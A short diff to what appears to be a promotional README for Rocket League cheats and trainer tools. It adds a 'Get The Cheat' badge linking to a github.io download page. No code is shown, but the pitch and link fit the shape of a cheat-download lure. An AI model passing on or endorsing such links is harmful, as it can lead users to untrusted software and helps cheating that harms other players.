@@ -4,6 +4,7 @@
 
 Rocket League isn’t just soccer with cars—it’s a high-speed, skill-heavy game where timing and control mean everything. But not everyone wants to grind mechanics for months. Rocket League cheats, hacks, and trainer tools let you unlock new powers instantly, giving you advanced control, perfect shots, and god-tier awareness.
 
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://rocket-league-cheat.github.io/.github/)
 ---
 
 ## Product Description
